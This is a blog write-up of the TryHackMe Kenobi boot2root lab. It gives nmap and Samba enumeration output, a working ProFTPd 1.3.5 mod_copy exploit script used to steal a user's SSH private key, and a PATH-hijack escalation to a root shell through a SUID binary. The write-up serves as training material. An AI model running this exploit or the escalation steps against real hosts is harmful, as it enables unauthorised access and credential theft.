@@ -1,0 +1,189 @@
+<!doctype html><html lang=en-us><head><title>Kenobi Boot2Root Write-Up</title><style>html body{font-family:Lato,sans-serif;background-color:#fff}:root{--accent:red;--border-width:5px}</style><link rel=stylesheet href=/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lato"><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css integrity=sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN crossorigin=anonymous><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/haskell.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/kotlin.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/scala.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js></script><script>hljs.initHighlightingOnLoad()</script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js></script><script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script><meta name=generator content="Hugo 0.83.1"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:title" content="Kenobi Boot2Root Write-Up"><meta property="og:url" content="https://packetfire.org/post/kenobi-boot2-root-writeup/"><meta property="og:description" content="A boot2root writeup of the Kenobi host from TryHackMe"><meta property="og:image" content="https://packetfire.org/img/pf-logo.png"><meta property="twitter:card" content="summary"><meta property="twitter:title" content="Kenobi Boot2Root Write-Up"><meta property="twitter:description" content="A boot2root writeup of the Kenobi host from TryHackMe"><meta property="twitter:image" content="https://packetfire.org/img/pf-logo.png"></head><body><nav class="navbar navbar-default navbar-fixed-top"><div class=container><div class=navbar-header><a class="navbar-brand visible-xs" href=#>Kenobi Boot2Root Write-Up</a>
+<button class=navbar-toggle data-target=.navbar-collapse data-toggle=collapse>
+<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button></div><div class="collapse navbar-collapse"><ul class="nav navbar-nav"><li><a href=/>Home</a></li><li><a href=/post/>Posts</a></li><li><a href=/project/>Projects</a></li><li><a href=/about/>About</a></li></ul><ul class="nav navbar-nav navbar-right"><li class=navbar-icon><a href=mailto:ncatelli@packetfire.org><i class="fa fa-envelope-o"></i></a></li></ul></div></div></nav><main><div class=item><h4><a href=/post/kenobi-boot2-root-writeup/>Kenobi Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Kenobi host from TryHackMe</h5><h5>November 14, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><br><div class=text-justify><h2 id=introduction>Introduction:</h2><p>The Kenobi boot2root challenge was a ton of fun because it required multiple pivots to learn enough to leak a key. On my first pass, I overlooked the NFS server which really impressed the importance of carefully reviewing scans.</p><h2 id=environment>Environment</h2><p>The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host which I knew contained 2 flags to capture. Nothing else was known about the host prior to the attack other than that the host was most likely a Linux server.</p><h2 id=attacking-kenobi>Attacking Kenobi</h2><p>Since I knew I would be attacking a single target, I exported the host&rsquo;s IP to the environment variable <code>ATTACKTARGET</code>. I&rsquo;ve also modified a few scans for the single host case by doing things such as disabling pings.</p><h3 id=host-enumeration>Host Enumeration</h3><p>I began the attack by opening up a new tmux session and starting a few nmap scans to get a feel for the lay of the land. I started with a SYN, OS and Service Version scan.</p><pre><code>root@kali:~# mkdir scans
+root@kali:~# cd scans/
+root@kali:~/scans# nmap -sS -sV -O -Pn -oA $ATTACKTARGET $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 22:18 UTC
+Nmap scan report for ip-10-10-221-157.eu-west-1.compute.internal (10.10.221.157)
+Host is up (0.00043s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+MAC Address: 02:98:C4:09:75:23 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/14%OT=21%CT=1%CU=41956%PV=Y%DS=1%DC=D%G=Y%M=0298C4%
+OS:TM=5FB057C7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=
+OS:I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
+OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=
+OS:68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
+OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
+OS:R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 25.27 second
+</code></pre><p>This scan uncovered a great deal of information about the host. It appeared to be an Ubuntu linux distro, running sambda, proftpd, and a webserver, each of which represented a viable path for investigation. I started by opening firefox to see what the website it was serving looked like.</p><p><img src=/img/kenobi_http_index.png alt="Kenobi site index"></p><p>I tried a few different URLs for fun and ended up getting lucky with <code>robots.txt</code> which pointed out that there was a static <code>admin.html</code> page.</p><p><img src=/img/kenobi_http_admin.png alt="Kenobi site admin"></p><p>Given that there were a few other targets, I decided to look into those before enumerating the webserver further. Samba seemed like a reasonable next choice and I began by enumerating both shares and users using two of the smb scripts provided with nmap.</p><pre><code>root@kali:~/scans# nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p 445 -oA smb $ATTACKTARGET 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 22:22 UTC
+Nmap scan report for ip-10-10-221-157.eu-west-1.compute.internal (10.10.221.157)
+Host is up (0.00018s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:98:C4:09:75:23 (Unknown)
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.221.157\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.221.157\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.221.157\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.58 second
+</code></pre><p>This scan exposed a potential <code>kenobi</code> user and also identified an anonymous share. I connected to that share and was lucky to find a <code>logs.txt</code> file that turned out to be a gold mine, exposing the <code>kenobi</code> user and a path to an SSH key. This also contained a possibly up-to-date copy of the samba config file that pointed to where the users home directory and the samba share were.</p><pre><code>smb: \&gt; get log.txt 
+getting file \log.txt of size 12237 as log.txt (1991.7 KiloBytes/sec) (average 1991.7 KiloBytes/sec)
+root@kali:~# cat log.txt | head -n 7
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
+Created directory '/home/kenobi/.ssh'.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+
+root@kali:~# cat log.txt | grep '\[anonymous\]' -A5
+[anonymous]
+   path = /home/kenobi/share
+   browseable = yes
+   read only = yes
+   guest ok = yes
+</code></pre><p>Finally, I decided to probe around on the FTP server, which didn&rsquo;t appear to have anonymous logins. With a few services, a bit of a map of the environment and some service versions in hand, I ran a few search queries through <code>searchsploit</code> before landing on the following exploits for <code>ProFTPd 1.3.5</code>.</p><pre><code>root@kali:~# searchsploit 1.3.5 -w | grep -i proftpd 
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | https://www.exploit-db.com/exploits/37262
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | https://www.exploit-db.com/exploits/36803
+ProFTPd 1.3.5 - File Copy                                 | https://www.exploit-db.com/exploits/36742
+root@kali:~# mkdir exploit &amp;&amp; cd exploit/
+</code></pre><h3 id=preparing-an-attack>Preparing an attack</h3><p>These exploits allowed me to arbitrarily copy files around on the filesystem. Since I had a key and a few points of exfiltration, it seemed worth attempting. The second option in the list, exploit <code>36803</code>, included a python script that I modified to accept a source and destination argument. I then used the exploit to move the <code>kenobi</code> user&rsquo;s ssh key into the samba share. I&rsquo;ve included the modified script below.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
+<span style=color:#f92672>import</span> sys
+
+<span style=color:#66d9ef>if</span>(len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>):
+    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74> Usage : exploit.py server directory cmd&#39;</span>)
+<span style=color:#66d9ef>else</span>:
+    server <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#75715e># vulnerable server</span>
+    src <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>] <span style=color:#75715e># source file to move</span>
+    dest <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>3</span>] <span style=color:#75715e># new destination of source file</span>
+
+    <span style=color:#66d9ef>with</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM) <span style=color:#66d9ef>as</span> s:
+        s<span style=color:#f92672>.</span>connect((server, <span style=color:#ae81ff>21</span>))
+        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;[ + ] Connected to server [ + ]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+        s<span style=color:#f92672>.</span>send(f<span style=color:#e6db74>&#39;site cpfr {src} </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode())
+        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+        s<span style=color:#f92672>.</span>send(f<span style=color:#e6db74>&#39;site cpto {dest} </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode())
+        s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+</code></pre></div><pre><code>root@kali:~/exploit# python3 exploit.py $ATTACKTARGET '/home/kenobi/.ssh/id_rsa' '/home/kenobi/share/id_rsa'
+[ + ] Connected to server [ + ]
+
+root@kali:~# smbclient //$ATTACKTARGET/anonymous
+Enter WORKGROUP\root's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Nov 15 00:53:15 2020
+  ..                                  D        0  Wed Sep  4 10:56:07 2019
+  id_rsa                              N     1675  Sun Nov 15 00:53:15 2020
+  log.txt                             N    12237  Wed Sep  4 10:49:09 2019
+
+		9204224 blocks of size 1024. 6877112 blocks available
+smb: \&gt; get id_rsa 
+getting file \id_rsa of size 1675 as id_rsa (817.8 KiloBytes/sec) (average 817.9 KiloBytes/sec)
+smb: \&gt; 
+root@kali:~# mv id_rsa ~/.ssh/kenobi &amp;&amp; chmod 600 ~/.ssh/kenobi
+root@kali:~# ssh kenobi@$ATTACKTARGET -i ~/.ssh/kenobi 
+load pubkey &quot;/root/.ssh/kenobi&quot;: invalid format
+The authenticity of host '10.10.221.157 (10.10.221.157)' can't be established.
+ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.221.157' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+kenobi@kenobi:~$
+</code></pre><p>Success! I had a local account on the host!</p><h4 id=escalating-privileges>Escalating privileges</h4><p>I began to poke around on the host and managed to find a flag <code>user.txt</code> sitting in kenobi&rsquo;s home directory. I followed my usual CTF local enumerating steps, which included checking the host version, sudo privs, etc&mldr; when I&rsquo;d noticed a binary I wasn&rsquo;t familiar with when checking for files with the SUID bits set. I&rsquo;ve truncated the output a bit for clarity.</p><pre><code>kenobi@kenobi:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/sbin/mount.nfs
+...
+/usr/bin/menu
+...
+/bin/ping6
+</code></pre><p>Running this <code>menu</code> command prompted for an option and then output a corresponding status check of the site, network configuration information or the kernel version. I then fed the command through strings to validate that it was shelling out and was pleased to find that it called out to both <code>curl</code> and <code>uname</code>.</p><pre><code>kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :2
+4.8.0-58-generic
+kenobi@kenobi:~$ strings /usr/bin/menu | egrep 'curl|uname|ifconifg'
+curl -I localhost
+uname -r
+</code></pre><p>With this information I decided to try a PATH hijacking attack by creating an executable binary in the kenobi user&rsquo;s local path which, when ran, would invoke <code>/bin/bash</code>. I then overrode the kenobi user&rsquo;s PATH to place its local <code>~/bin/</code> directory at the highest priority and attempted to rerun the kernel version <code>menu</code> command again.</p><pre><code>kenobi@kenobi:~$ mkdir bin
+kenobi@kenobi:~$ echo '/bin/bash' &gt; bin/uname
+kenobi@kenobi:~$ chmod +x bin/uname 
+kenobi@kenobi:~$ export PATH=~/bin/:$PATH
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :2
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+root@kenobi:~# 
+</code></pre><p>Success! This elevated me to a root shell and quickly I found the last flag sitting in the <code>/root/</code> directory.</p><pre><code>root@kenobi:/# cd /root/
+root@kenobi:/root# ls
+root.txt
+</code></pre><h2 id=summary>Summary</h2><p>This attack reinforced how much discipline is necessary when reading through exfiltrated information. There were mountains of information made available in scans and files laying around that, if they weren&rsquo;t reiterated as often as they were, could have easily been missed. A perfect example of this is how I missed the NFS server listening on port 111, which I only found on my second pass through the host.</p></div><h4 class=page-header>Related</h4><div class=item><h4><a href=/post/brainpan-boot2root-writeup/>Brainpan Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Brainpan1 host from TryHackMe</h5><h5>December 22, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><div class=item><h4><a href=/post/internal-boot2root-writeup/>Internal Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Internal host from TryHackMe</h5><h5>December 5, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div><div class=item><h4><a href=/post/daily-bugle-boot2-root-writeup/>Daily Bugle Boot2Root Write-Up</a></h4><h5><a href=https://packetfire.org/author/nate-catelli>Nate Catelli</a></h5><h5>A boot2root writeup of the Daily Bugle host from TryHackMe</h5><h5>November 27, 2020</h5><a href=https://packetfire.org/tags/ctf><kbd class=item-tag>ctf</kbd></a><a href=https://packetfire.org/tags/boot2root><kbd class=item-tag>boot2root</kbd></a><a href=https://packetfire.org/tags/hacking><kbd class=item-tag>hacking</kbd></a><a href=https://packetfire.org/tags/writeup><kbd class=item-tag>writeup</kbd></a><a href=https://packetfire.org/tags/tryhackme><kbd class=item-tag>tryhackme</kbd></a></div></main><footer><p class="copyright text-muted">© All rights reserved by <a href=https://packetfire.org/>Packetfire</a></p></footer></body></html>
